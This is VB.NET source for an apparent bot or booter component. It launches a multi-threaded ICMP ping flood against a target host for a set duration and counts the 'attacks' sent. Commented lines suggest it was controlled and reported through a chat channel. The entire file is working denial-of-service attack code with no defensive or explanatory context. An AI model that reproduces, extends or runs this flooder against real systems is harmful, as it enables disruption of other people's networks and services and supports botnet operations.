
Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation

Public Module icmp

    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Public Sub Starticmp(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host

            ThreadstoUse = Threadsto
            TimetoAttack = Time
            Threads = New Thread(Threadsto - 1) {}
            Mainmenu.changeStatus("ICMP attack")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

        Else
            ' Form1.TalktoChannel("A ICMP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            'Form1.TalktoChannel("ICMP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        End If

    End Sub

    Public Sub Stopicmp()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            'Form1.TalktoChannel("ICMP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            'Form1.TalktoChannel("No Condis Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()

        Try

            '  Dim tcpc As New Net.Sockets.Socket(Net.Sockets.AddressFamily.InterNetwork, Net.Sockets.SocketType.Stream, Net.Sockets.ProtocolType.Tcp)
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim Data As String
            For i = 0 To Port
                Data += "a"
            Next
            Do While (stopwatch.Elapsed < span)
                Try
                    My.Computer.Network.Ping(HostToAttack)
                    Dim pingSender As Ping = New Ping()
                    'Dim address As IPAddress = IPAddress.Loopback


                    Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)


                    Dim Timeout As Integer = 10000


                    Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
                    Attacks = Attacks + 1
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop



        Catch : End Try

        lol()
    End Sub
End Module
